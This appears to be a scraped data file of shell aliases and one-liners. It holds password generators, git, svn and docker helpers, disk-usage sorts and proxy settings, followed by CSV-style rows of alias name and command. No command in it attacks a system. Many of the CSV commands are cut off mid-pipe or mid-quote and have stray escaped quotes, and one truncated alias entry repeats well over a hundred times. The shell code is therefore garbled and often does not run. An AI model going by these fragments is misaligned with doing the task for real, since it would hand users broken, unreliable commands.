OB EY""| cowsay -n -f $(ls /usr/share/cows/ | shuf -n1)"
M | fzf | cdr
LC_CTYPE=C tr -dc _A-Z-a-z-0-9 < /dev/urandom | fold -w24 | head -n1
LC_CTYPE=C tr -dc A-Za-z0-9_\!\@\#\$\^\%\^\&\*\(\)-+= < /dev/urandom | head -c 16 | xargs
LC_CTYPE=C tr -dc A-Za-z0-9 < /dev/urandom | tr -d Il1 | head -c 32
LC_CTYPE=C tr -dc 'a-zA-Z0-9' < /dev/urandom | fold -w 14 | head -n 1
LC_CTYPE=C tr -dc '[:alnum:]' < /dev/urandom | fold -w 40 | head -n 1
LC_CTYPE=C tr -dc 'A-Za-z0-9_-' < /dev/urandom | fold -w 16 | head -n1
LC_CTYPE=C tr -dc 'A-F0-9' < /dev/urandom | fold -w 32 | head -n1
LC_ALL=C.UTF-8 sort | LC_ALL=C.UTF-8 uniq -c | LC_ALL=C.UTF-8 sort -rn
LC_ALL=C tr -dc '[:alpha:][:alnum:]' < /dev/urandom | head -c 40 | pbcopy
LC_ALL=C tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 16 | xargs echo
LC_ALL=C tr -c '[:digit:]' ' ' < /dev/urandom | dd cbs=$COLUMNS conv=unblock | GREP_COLOR='1;32' grep --color '[^ ]'
LC_ALL=C svn info | grep --color=never -P 'URL:' | cut -d ' ' -f 2
LC_ALL=C svn info | grep --color=never -P 'Last Changed Rev:' | cut -d ' ' -f 4
LC_ALL=C svn info | grep 'Repository Root:' | cut -d ' ' -f 3
LC_ALL=C pacman -Qi | sed -n '/^Name[^:]*: \(.*\)/{s//\1 /;x};/^Installed[^:]*: \(.*\)/{s//\1/;H;x;s/\n//;p}' | sort -nk2
LAST=\$(history |tail -n2 |head -n1); yy \$LAST
LANG=en_US git branch --merged | grep -v master | xargs git branch -D
LANG=C pacman -Qi | sed -n '/^Name[^:]*: \(.*\)/{s//\1 /;x};/^Installed[^:]*: \(.*\)/{s//\1/;H;x;s/\n//;p}' | sort -nk2
INFO echo '### Available Drush Functions (.bash_drush) ###'; CMDINFO echo -n; cat ~/.bash_drush | grep function; echo -n; INFO echo '### Drush aliases (.bash_drush) ###:'; CMDINFO echo -n; cat ~/.bash_drush | grep alias; echo -n; NORMAL
IFS=$'\n' sudo docker rm $( sudo docker ps -a |grep 'Exited'|awk '{print $1}')
HTTPS_PROXY=http://fwdproxy:8080 HTTP_PROXY=http://fwdproxy:8080 FTP_PROXY=http://fwdproxy:8080 https_proxy=http://fwdproxy:8080 http_proxy=http://fwdproxy:8080 ftp_proxy=http://fwdproxy:8080 http_no_proxy='*.facebook.com|*.tfbnw.net|*.fb.com'
HTTPS_PROXY=http://fwdproxy.any:8080 HTTP_PROXY=http://fwdproxy.any:8080 FTP_PROXY=http://fwdproxy.any:8080 https_proxy=http://fwdproxy.any:8080 http_proxy=http://fwdproxy.any:8080 ftp_proxy=http://fwdproxy.any:8080 http_no_proxy='*.facebook.com|*.tfbnw.net|*.fb.com'
HID=$(history | fzf | c1) && history -d $HID
H | fzf | z
EOS_MGM_URL=root://eosuser.cern.ch eos quota | head -6 | tail -2
DISPLAY=:0 nvidia-settings -tdq ':0.0/gpucoretemp' | sed -e 's/^\([0-9]\+\)$/GPU: \t\1\xc2\xb0C/'; sensors | sed -e's/^Core \([01]\)[^(]*+\([0-9]\+\)\..*$/Core\1: \t\2\xc2\xb0C/p' -e'd'
D | fzf | d
CRYSTAL_BIN=\$([ -f ./bin/crystal ] && echo ./bin/crystal || echo \$(which crystal)); \$CRYSTAL_BIN
CONTAINER=$(docker ps -qa) && docker kill $CONTAINER || true && docker rm $CONTAINER
CLICOLOR_FORCE=1 du -sk err.txt generated.file succ.txt | sort -nr | head -3
C | fzf | ve
BRANCH=`git branch --no-color 2>/dev/null | grep '*' | awk '{ print $2 }'` git pull origin $BRANCH && git push origin $BRANCH
BRANCH=\`git branch | grep '*' | sed 's/* //'\`; git push -u origin \$BRANCH --no-verify
BRANCH=\`git branch | grep '*' | sed 's/* //'\`; git push -u origin \$BRANCH
BLOCKSIZE=1048576; du -xh | sort -nr | head -10
BLOCKSIZE=1048576; du -x | sort -nr | head -10
BLOCKSIZE=1048576; du -x -h | sort -nr | head -10
BLOCKSIZE=1048576 du -x | sort -nr | head -10
BASTION=\$(grep -E '^Host kzsu-ssh[1-9]' ~/.ssh/config | cut -d' ' -f2 | perl -wl -e '@f=<>; print \$f[rand \$#f + 1]'); echo Tunneling into \$BASTION; ssh -fN \$BASTION
=ls -lSh -- *(.) | grep -v total | head $@ 2&>/dev/null
</dev/urandom tr -dc '12345@#$%^&*(){}_A-Z-a-z-0-9'| fold -w15 | head -15
</dev/urandom tr -dc '12345@#$%^&*(){}_A-Z-a-z-0-9'| fold -w10 | head -10
< ~/.ssh/id_rsa.pub | pbcopy | printf '=> Public key copied to pasteboard.\n'
< /dev/urandom tr -dc 1-6|fold -w 1| head -n 1
< /dev/urandom tr -dc 'a-zA-Z0-9-_!@#$%^&*()_+{}|:<>?=' | head -c 32
< /dev/urandom tr -cd \[:graph:\] | fold -w32 | head -n 5
< /dev/urandom tr -cd \[:graph:\] | fold -w 32 | head -n 5
< /dev/urandom tr -cd \[:graph:\] | fold -w 32 | head -n 1
< /dev/urandom tr -cd \[:graph:\] | fold -w 30 | head -n 1
< /dev/urandom tr -cd \[:graph:\] | fold -w 20 | head -n 1
< /dev/urandom tr -cd \[:alnum:\] | fold -w 32 | head -n 5
: ||
: > ~/.ssh/config && echo '# DO NOT EDIT! Please edit conf.d/' >> ~/.ssh/config && find ~/.ssh/conf.d -type f | grep -v '/\.git' | xargs cat >> ~/.ssh/config; ssh
: > ~/.ssh/config && echo '# DO NOT EDIT! Please edit conf.d/' >> ~/.ssh/config && find ~/.ssh/conf.d -type f | grep -v '/\.git' | xargs cat >> ~/.ssh/config
978228,226228,duch,du -ch | grep insgesamt |\"
976846,226053,co,branch|fzf|xargs git checkout"""
928621,217150,duf,du -sk ./err.txt ./generated.file ./succ.txt | sort -n | perl -ne """
909057,215266,duch,du -ch | grep insgesamt |\"
825987,199262,formatc,find . -type f -regex '.*\.\(c\|cpp\|h\)' -exec sh -c \"
741612,183370,xcode,find . -name *.xcworkspace -maxdepth 1 | head -1 | xargs open"""
545126,145973,dockerclean,dockercleanc || true && dockercleani"""
4656250,875752,shell, /root/.bashrc || echo -e $shell >> /root/.bashrc"""
4575077,847242,top3,du - s err.txt generated.file succ.txt | sort - nr | head - 3"""
4518995,753895,moodbar-ls,for i in err.txt generated.file succ.txt ; do [ -f """"$i"""" ] || continue ; echo """"$i:"""" ; moodbar-preview256 """"$i"""" ; done"""
445742,129917,gpwd,pwd | strip_newlines | system_copy"""
4385869,708509,lr,ls -R | grep """":$"""" | sed -e """
437434,127424,cpwd,pwd|tr -d '\n'|pbcopy"""
4367037,704772,lr,ls -R | grep """":$"""" | sed -e """
4349650,700851,wup,.s; FINA=0 up 4; TBL=wind SCREENER 0 || up wind"""
4313002,695990,ducks,du -cks *|sort -rn|head -11"""
4309189,695215,grep, /etc/profile || \"
4307453,694967,__git_ps1,git branch 2>/dev/null | grep '*' | sed 's/* \(.*\)/(\1)/'"""
4300058,693861,lr,ls -R | grep """":$"""" | sed -e """
4247432,681530,duch,du -ch | grep insgesamt |\"
4247092,681518,duch,du -ch | grep insgesamt |\"
4164932,663038,ifconfig+,ip addr | grep UP | cut -f2 -d"""":"""""""
4125070,652836,gr,[ ! -z `git rev-parse --show-cdup` ] && cd `git rev-parse --show-cdup || pwd`"""
4087882,647373,tm,tmux attach || tmux new"""
401833,121924,psg,ps aux | grep -v grep | grep -i -e VSZ -e"""
4005448,632888,myip,ifconfig | grep """"inet """" | grep -v 127.0.0.1"""
3786011,592424,lr,ls -R | grep """":$"""" | sed -e """
3741884,587453,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741848,587452,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741812,587450,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741776,587449,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741679,587446,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741636,587444,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741600,587443,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741564,587442,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741528,587441,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741492,587440,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741396,587438,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741276,587433,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741174,587430,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741138,587429,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741102,587428,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741066,587427,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3741030,587426,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740994,587425,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740958,587424,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740921,587422,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740885,587421,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740849,587420,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740813,587419,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740777,587418,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740741,587417,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740705,587416,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740669,587415,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740523,587411,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740487,587410,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740451,587409,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740415,587408,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740269,587405,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740174,587402,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740138,587401,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740102,587400,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740066,587399,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3740030,587398,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739982,587395,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739946,587394,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739910,587393,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739874,587392,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739838,587391,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739802,587390,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739766,587389,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739730,587388,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739694,587387,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739658,587386,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739622,587385,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739586,587384,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739550,587383,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739514,587382,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739476,587379,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739440,587378,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739404,587377,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739368,587376,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739332,587375,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739296,587374,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739260,587373,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739224,587372,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739188,587371,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739152,587370,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739116,587369,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739080,587368,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739044,587367,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3739008,587366,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738972,587365,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738936,587364,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738900,587363,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738773,587360,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738737,587359,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738701,587358,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738608,587355,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738572,587354,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738522,587352,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738486,587351,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738450,587350,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738414,587349,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738378,587348,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738342,587347,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738240,587344,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738204,587343,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738168,587342,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738132,587341,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738096,587340,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738060,587339,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3738024,587338,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737988,587337,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737952,587336,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737916,587335,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737880,587334,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737844,587333,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737808,587332,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737772,587331,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737736,587330,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737700,587329,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737664,587328,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737622,587326,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737586,587325,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737550,587324,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737514,587323,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737478,587322,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737442,587321,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737406,587320,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737370,587319,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737334,587318,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737298,587317,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737262,587316,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737226,587315,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737190,587314,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737154,587313,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737115,587311,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737079,587310,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737043,587309,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3737007,587308,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736971,587307,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736935,587306,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736899,587305,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736863,587304,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736827,587303,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736791,587302,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736755,587301,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736719,587300,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736683,587299,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736647,587298,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736611,587297,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736575,587296,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736539,587295,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736503,587294,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736467,587292,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736431,587291,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736395,587290,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736359,587289,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736323,587288,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736287,587287,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736245,587284,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736209,587283,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736173,587282,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736137,587281,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736101,587280,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736065,587279,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3736029,587278,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735993,587277,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735957,587276,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735921,587275,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735885,587274,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735849,587273,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735813,587272,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735777,587270,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735741,587269,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735701,587264,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735665,587263,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735629,587262,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735593,587261,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735557,587260,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735521,587259,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735485,587258,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735449,587257,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735413,587256,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735377,587255,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735340,587253,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735304,587252,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735268,587251,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735232,587250,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735193,587248,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735157,587247,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735121,587246,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735085,587245,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735049,587244,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3735013,587243,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734977,587242,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734941,587241,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734905,587240,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734869,587239,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734833,587238,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734797,587237,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734761,587236,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734725,587235,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734689,587234,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734653,587233,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734617,587232,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734581,587231,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734545,587230,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734509,587229,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734473,587228,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734437,587227,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734401,587226,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734365,587225,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734329,587224,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734293,587223,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734257,587222,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734221,587221,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734185,587220,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734149,587219,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734113,587218,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734077,587217,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734041,587216,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3734005,587215,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733966,587213,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733930,587212,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733894,587211,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733852,587208,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733816,587207,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733780,587206,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733744,587205,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733708,587204,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733672,587203,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733636,587202,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733600,587201,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733564,587200,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733528,587199,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733492,587198,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733456,587197,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733420,587196,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733384,587195,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733348,587194,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733312,587193,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
3733276,587192,ail,sed -e 's/ */ /g' -e 's/ *//' | cut -s -d ' ' -f 1 | """
